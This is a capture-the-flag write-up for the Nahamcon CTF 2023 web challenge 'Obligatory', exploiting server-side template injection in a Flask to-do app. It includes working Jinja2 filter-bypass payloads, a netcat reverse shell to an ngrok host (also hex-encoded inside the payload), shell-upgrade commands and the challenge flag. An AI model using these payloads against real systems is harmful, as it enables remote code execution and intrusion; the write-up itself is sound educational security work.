---
name: Obligatory (2023)
event: Nahamcon CTF 2023
category: Web
description: Writeup for Obligatory (Web) - Nahamcon CTF (2023) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Obligatory

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/XHg_sBD0-es/0.jpg)](https://www.youtube.com/watch?v=XHg_sBD0-es?t=1075 "Nahamcon CTF 2023: Obligatory (Web)")

## Description

> Every Capture the Flag competition has to have an obligatory to-do list application, right???

## Solution

Register account and try some payloads (XSS, SSTI, SQLi) but the notes all render as text without issues.

However, when a task is created there's a GET parameter `success`, that's set to `Task created`.

When changing the value to an [SSTI polyglot](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection), `${{<%[%'"}}%\`, we get an error message.

{% code overflow="wrap" %}
```python
HACKER DETECTED!!!!
The folowing are not allowed: [ {{\s*config\s*}},.*class.*,.*mro.*,.*import.*,.*builtins.*,.*popen.*,.*system.*,.*eval.*,.*exec.*,.*\..*,.*\[.*,.*\].*,.*\_\_.* ]
```
{% endcode %}

Bypasses: https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#accessing-subclasses-with-bypasses

More bypasses here: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---filter-bypass

{% code overflow="wrap" %}
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
{% endcode %}

It's blocked due to `builtin` and `popen`, so let's go through it manually.

{% code overflow="wrap" %}
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
```
{% endcode %}

We can use hex or concatenation to bypass the filter.

{% code overflow="wrap" %}
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuil'+'tins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimp'+'ort\x5f\x5f')('os')|attr('pop'+'en')('id')|attr('read')()}}
```
{% endcode %}

We don't get output.. let's [hex encode a reverse shell](<https://gchq.github.io/CyberChef/#recipe=To_Hex('%5C%5Cx',0)&input=cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI%2BJjF8bmMgOC50Y3Aubmdyb2suaW8gMTU3MjMgPi90bXAvZg>).

{% code overflow="wrap" %}
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 8.tcp.ngrok.io 15723 >/tmp/f
```
{% endcode %}

{% code overflow="wrap" %}
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuil'+'tins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimp'+'ort\x5f\x5f')('os')|attr('pop'+'en')('\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x66\x3b\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x66\x3b\x63\x61\x74\x20\x2f\x74\x6d\x70\x2f\x66\x7c\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x69\x20\x32\x3e\x26\x31\x7c\x6e\x63\x20\x38\x2e\x74\x63\x70\x2e\x6e\x67\x72\x6f\x6b\x2e\x69\x6f\x20\x31\x35\x37\x32\x33\x20\x3e\x2f\x74\x6d\x70\x2f\x66')|attr('read')()}}
```
{% endcode %}

Make the shell interactive.

{% code overflow="wrap" %}
```bash
python3 -c 'import pty;pty.spawn("/bin/bash");'
CTRL+Z
stty raw -echo; fg;
export TERM=linux;clear;
```
{% endcode %}

Check the database folder.

{% code overflow="wrap" %}
```bash
cd DB
strings *
```
{% endcode %}

We find the flag!

Flag: `flag{7b5b91c60796488148ddf3b227735979}`
